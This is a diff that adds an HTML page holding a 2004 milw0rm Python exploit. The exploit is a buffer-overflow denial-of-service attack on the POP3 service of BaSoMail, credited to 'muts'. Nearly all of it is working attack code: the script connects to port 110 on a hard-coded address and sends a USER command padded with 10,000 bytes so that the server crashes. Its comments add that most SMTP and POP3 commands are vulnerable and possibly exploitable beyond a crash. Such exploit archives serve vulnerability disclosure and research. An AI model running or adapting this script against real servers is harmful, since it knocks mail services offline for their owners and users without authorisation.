@@ -1,0 +1,33 @@
+<html><head><title>BaSoMail Multiple Buffer Overflow Denial of Service Exploit</title></head><pre>#########################################################
+# BaSoMail Multiple Buffer Overflow DOS		 	#
+# 24 Oct 2004 - muts 					#
+# Probably exploitable - However, I lack sleep!        	#
+#########################################################
+
+import struct
+import socket
+
+print &quot;\n\n######################################################&quot;
+print &quot;\nBaSoMail Multiple Buffer Overflow DOS&quot;
+print &quot;\nFound &amp; coded by muts [at] whitehat.co.il&quot;
+print &quot;\nAlmost all the SMTP and POP3 commands are prone to BO.\n&quot; 
+print &quot;\nFor Educational Purposes Only!\n&quot; 
+print &quot;\n\n######################################################&quot;
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+# Example buffer overflow 
+
+buffer = '\x41'*10000
+
+try:
+	print &quot;\nSending evil buffer...&quot;
+	s.connect(('192.168.1.32',110))
+	s.send('USER ' + buffer + '\r\n')
+	data = s.recv(1024)
+	s.close()
+	print &quot;\nRun this script again, and server should crash.&quot;
+except:
+	print &quot;\nCould not connect to sever!&quot;
+
+# milw0rm.com [2004-10-26]</pre></html>
